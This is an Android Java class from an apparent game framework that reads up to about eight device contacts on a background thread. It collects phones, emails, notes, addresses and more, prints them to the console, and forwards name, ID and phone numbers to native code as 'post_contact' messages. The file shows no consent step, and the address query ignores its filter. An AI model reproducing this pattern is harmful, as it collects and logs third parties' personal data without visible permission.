package org.gamekit.jni;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.ContactsContract;


public class DataCollector {

	private static boolean RECEIVING_CONTACTS = false;

	public static void startContactCollection(final Activity act) {
		if (RECEIVING_CONTACTS)
			return;
		
		RECEIVING_CONTACTS = true;
		new Thread(new Runnable() {
			@Override
			public void run() {
				DataCollector.readContacts(act);
				RECEIVING_CONTACTS = false;
			}
		}).start();
	}
	
	
    public static void readContacts(Activity activity ){
        ContentResolver cr = activity.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
               null, null, null, null);

        int counter = 0;
        if (cur.getCount() > 0) {
           while (cur.moveToNext()) {
        	   if (counter++>7) 
        		   break;
        	   JSONObject json = new JSONObject();

               String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
               String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
               if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                   System.out.println("name : " + name + ", ID : " + id);
                   
                   
                   try {
					json.put("name",name);
					   json.put("id",id);
				} catch (JSONException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				} 
                   
                   
                   JSONArray phoneNumbers = new JSONArray();
                   // get the phone number
                   Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
                                          ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
                                          new String[]{id}, null);
                   while (pCur.moveToNext()) {
                         String phone = pCur.getString(
                                pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                         System.out.println("phone" + phone);
                         phoneNumbers.put(phone);
                   }
                   try {
					json.put("phone", phoneNumbers);
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
                   pCur.close();


                   
                   
                   // get email and type
                  Cursor emailCur = cr.query(
                           ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                           null,
                           ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                           new String[]{id}, null);
                   while (emailCur.moveToNext()) {
                       // This would allow you get several email addresses
                           // if the email addresses were stored in an array
                       String email = emailCur.getString(
                                     emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                       String emailType = emailCur.getString(
                                     emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));

                       
                       System.out.println("Email " + email + " Email Type : " + emailType);
                   }
                   emailCur.close();

                   // Get note.......
                   String noteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                   String[] noteWhereParams = new String[]{id,
                   ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE};
                           Cursor noteCur = cr.query(ContactsContract.Data.CONTENT_URI, null, noteWhere, noteWhereParams, null);
                   if (noteCur.moveToFirst()) {
                       String note = noteCur.getString(noteCur.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
                     System.out.println("Note " + note);
                   }
                   noteCur.close();

                   //Get Postal Address....

                   String addrWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                   String[] addrWhereParams = new String[]{id,
                       ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE};
                   Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI,
                               null, null, null, null);
                   while(addrCur.moveToNext()) {
                       String poBox = addrCur.getString(
                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POBOX));
                       String street = addrCur.getString(
                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
                       String city = addrCur.getString(
                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
                       String state = addrCur.getString(
                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
                       String postalCode = addrCur.getString(
                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
                       String country = addrCur.getString(
                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
                       String type = addrCur.getString(
                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));

                       // Do something with these....

                   }
                   addrCur.close();

                   // Get Instant Messenger.........
                   String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                   String[] imWhereParams = new String[]{id,
                       ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE};
                   Cursor imCur = cr.query(ContactsContract.Data.CONTENT_URI,
                           null, imWhere, imWhereParams, null);
                   if (imCur.moveToFirst()) {
                       String imName = imCur.getString(
                                imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));
                       String imType;
                       imType = imCur.getString(
                                imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.TYPE));
                   }
                   imCur.close();

                   // Get Organizations.........

                   String orgWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                   String[] orgWhereParams = new String[]{id,
                       ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE};
                   Cursor orgCur = cr.query(ContactsContract.Data.CONTENT_URI,
                               null, orgWhere, orgWhereParams, null);
                   if (orgCur.moveToFirst()) {
                       String orgName = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
                       String title = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
                   }
                   orgCur.close();
                   
                   System.out.println("SEND MSG:"+json.toString());
                   OgreActivityJNI.sendMessage("android", "contact", "post_contact", json.toString());
               }
           }
      }
   }
    



	
}
